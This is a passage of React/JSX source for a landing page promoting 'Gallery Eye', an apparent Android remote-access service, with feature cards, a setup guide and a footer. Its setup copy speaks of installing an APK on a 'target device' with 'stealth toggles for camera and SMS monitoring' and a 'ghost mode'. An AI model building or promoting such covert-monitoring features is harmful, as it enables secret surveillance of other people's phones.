                        <div className="h-full p-6 sm:p-8 rounded-[1.85rem] bg-[#0c0d10] border border-white/[0.06] shadow-[inset_0_1px_1px_rgba(255,255,255,0.12)] flex flex-col justify-between relative overflow-hidden">
                            <div className="flex items-center justify-between mb-8">
                                <span className="px-3 py-1 rounded-lg bg-white/[0.06] border border-white/10 text-xs font-mono font-bold text-purple-400">
                                    03 // HARDWARE
                                </span>
                                <Zap className="w-7 h-7 text-purple-400/80" />
                            </div>
                            <div className="space-y-3 z-10">
                                <h3 className="text-xl sm:text-2xl font-bold text-white">
                                    Remote Flashlight & Vibration
                                </h3>
                                <p className="text-xs sm:text-sm text-slate-400 leading-relaxed">
                                    Locate a misplaced phone immediately by triggering remote SOS flashlight pulses, audio alarms, or haptic vibration from your web dashboard.
                                </p>
                            </div>
                        </div>
                    </div>

                    {/* Bento Card 4: Multi-Device Management (Col 8) */}
                    <div className="md:col-span-8 p-2 rounded-[2.25rem] bg-white/[0.03] border border-white/10 hover:border-indigo-500/40 transition-all group shadow-xl">
                        <div className="h-full p-8 sm:p-10 rounded-[1.85rem] bg-[#0c0d10] border border-white/[0.06] shadow-[inset_0_1px_1px_rgba(255,255,255,0.12)] flex flex-col justify-between relative overflow-hidden">
                            <div className="flex items-center justify-between mb-8">
                                <span className="px-3.5 py-1.5 rounded-xl bg-white/[0.06] border border-white/10 text-xs font-mono font-bold text-indigo-400">
                                    04 // MULTI-DEVICE FLEET
                                </span>
                                <Smartphone className="w-8 h-8 text-indigo-400/80" />
                            </div>
                            <div className="space-y-4 max-w-xl z-10">
                                <h3 className="text-2xl sm:text-3xl font-bold text-white">
                                    Seamless Multi-Device Switcher
                                </h3>
                                <p className="text-sm sm:text-base text-slate-400 leading-relaxed">
                                    Manage up to 10 connected Android devices from a single unified mission control. Switch active devices instantly without re-authenticating or dropping active background sync streams.
                                </p>
                            </div>
                            <div className="mt-6 flex flex-wrap gap-2 pt-4 border-t border-white/[0.06]">
                                <span className="px-3 py-1 rounded-lg bg-white/[0.04] text-xs font-mono text-slate-300">Pixel 8 Pro (Active)</span>
                                <span className="px-3 py-1 rounded-lg bg-white/[0.04] text-xs font-mono text-slate-300">Galaxy S24 Ultra</span>
                                <span className="px-3 py-1 rounded-lg bg-white/[0.04] text-xs font-mono text-slate-300">OnePlus 12</span>
                            </div>
                        </div>
                    </div>

                </div>
            </section>

            {/* SECTION 4: SCROLLYTELLING & VIDEO TUTORIAL (`how-it-works`) */}
            <section id="how-it-works" className="py-24 sm:py-36 px-4 sm:px-6 max-w-7xl mx-auto relative z-10 border-t border-white/10">
                <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
                    
                    {/* Setup Guide Step Checklist */}
                    <div className="lg:col-span-6 space-y-8">
                        <div>
                            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-xs font-semibold text-emerald-400 uppercase tracking-widest mb-4">
                                <Play className="w-3.5 h-3.5" />
                                <span>3-Step Quickstart Guide</span>
                            </div>
                            <h2 className="text-3xl sm:text-5xl font-extrabold tracking-tight text-white mb-4">
                                Up and Running in Under 60 Seconds
                            </h2>
                            <p className="text-slate-400 text-sm sm:text-base">
                                No complex root access or ADB debugging required. Connect any standard Android device effortlessly.
                            </p>
                        </div>

                        <div className="space-y-6">
                            {[
                                { step: '01', title: 'Install Companion APK', desc: 'Download our lightweight, battery-optimized Android service app (only 2.1 MB) directly to the target device.' },
                                { step: '02', title: 'Grant Vault Permissions', desc: 'Allow storage access for gallery mirroring and optional stealth toggles for camera and SMS monitoring.' },
                                { step: '03', title: 'Connect to Mission Control', desc: 'Sign in to this web dashboard from any PC or mobile browser worldwide to begin real-time management.' }
                            ].map((item, idx) => (
                                <div key={idx} className="flex gap-5 p-5 rounded-2xl bg-white/[0.03] border border-white/[0.08] hover:border-emerald-500/30 transition-all">
                                    <span className="text-2xl font-black font-mono text-emerald-400/80">{item.step}</span>
                                    <div>
                                        <h4 className="text-base font-bold text-white mb-1">{item.title}</h4>
                                        <p className="text-xs sm:text-sm text-slate-400 leading-relaxed">{item.desc}</p>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Right: Embedded VideoModal in Double-Bezel Display */}
                    <div className="lg:col-span-6">
                        <div className="p-2.5 rounded-[2.25rem] bg-gradient-to-b from-white/10 to-transparent border border-white/10 shadow-[0_30px_90px_rgba(0,0,0,0.8)]">
                            <div className="p-4 sm:p-6 rounded-[1.85rem] bg-[#0c0d10] border border-white/[0.06] shadow-[inset_0_1px_1px_rgba(255,255,255,0.15)]">
                                <div className="flex items-center justify-between mb-4 px-2">
                                    <span className="text-xs font-mono font-semibold text-slate-400 flex items-center gap-2">
                                        <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                                        VIDEO_TUTORIAL // WATCH_DEMO
                                    </span>
                                    <span className="text-xs font-mono text-slate-500">1080p · E2E SETUP</span>
                                </div>
                                <div className="rounded-2xl overflow-hidden border border-white/10">
                                    <VideoModal videoId="0xQaikNVyn0" label="Watch Complete Setup Walkthrough" variant="thumbnail" />
                                </div>
                            </div>
                        </div>
                    </div>

                </div>
            </section>

            {/* SECTION 5: INFINITE SECURITY MARQUEE & FINAL CTA */}
            <section className="py-16 bg-black border-y border-white/10 overflow-hidden relative z-10">
                <div className="flex items-center gap-12 whitespace-nowrap animate-marquee">
                    {[
                        'AES-256 ZERO-KNOWLEDGE ENCRYPTION', 'ANDROID 10 TO 15 COMPATIBLE',
                        'WEBSOCKET LOW-LATENCY STREAMING', 'STEALTH RADAR GHOST MODE',
                        'INSTANT BULK ZIP EXPORT', 'MULTI-DEVICE CLOUD SYNC',
                        'AES-256 ZERO-KNOWLEDGE ENCRYPTION', 'ANDROID 10 TO 15 COMPATIBLE',
                        'WEBSOCKET LOW-LATENCY STREAMING', 'STEALTH RADAR GHOST MODE'
                    ].map((badge, i) => (
                        <div key={i} className="inline-flex items-center gap-4 text-xs sm:text-sm font-mono font-bold tracking-widest text-slate-400 uppercase">
                            <span className="w-2 h-2 rounded-full bg-emerald-500" />
                            <span>{badge}</span>
                        </div>
                    ))}
                </div>
            </section>

            {/* Final Conversion Banner & Footer */}
            <footer className="py-20 px-4 sm:px-6 max-w-7xl mx-auto relative z-10 text-center">
                <div className="p-10 sm:p-16 rounded-[2.5rem] bg-gradient-to-b from-white/[0.05] to-transparent border border-white/10 relative overflow-hidden mb-16 shadow-2xl">
                    <div className="absolute inset-0 bg-radial from-emerald-500/10 to-transparent pointer-events-none" />
                    <h2 className="text-3xl sm:text-5xl font-extrabold text-white tracking-tight max-w-2xl mx-auto mb-6">
                        Ready to Take Full Control of Your Android?
                    </h2>
                    <p className="text-slate-400 text-sm sm:text-base max-w-xl mx-auto mb-8">
                        Sign into your vault right now or sign up with your Google account to get instant remote access across all your devices.
                    </p>
                    <button
                        onClick={() => scrollToSection('auth-vault')}
                        className="inline-flex items-center gap-3 px-8 py-4 rounded-full bg-emerald-500 hover:bg-emerald-400 text-white font-extrabold text-sm sm:text-base shadow-[0_0_40px_rgba(16,185,129,0.4)] transition-all hover:scale-105 active:scale-95"
                    >
                        <span>Authorize Vault Access</span>
                        <ArrowRight className="w-5 h-5" />
                    </button>
                </div>

                <div className="flex flex-col sm:flex-row items-center justify-between gap-6 pt-8 border-t border-white/[0.08] text-xs text-slate-500">
                    <div className="flex items-center gap-3">
                        <Image src="/gallery-eye-logo.jpg" alt="Gallery Eye" width={24} height={24} className="rounded-md object-cover" />
                        <span className="font-bold text-slate-400">Gallery Eye Remote Systems</span>
                    </div>
                    <span>© {new Date().getFullYear()} Gallery Eye. All rights reserved. Zero-Knowledge Architecture.</span>
                    <div className="flex items-center gap-6">
                        <a href="#features" className="hover:text-slate-300 transition-colors">Features</a>
                        <a href="#security" className="hover:text-slate-300 transition-colors">Security</a>
                        <a href="#how-it-works" className="hover:text-slate-300 transition-colors">Documentation</a>
                    </div>
                </div>
            </footer>
        </main>
    );
}
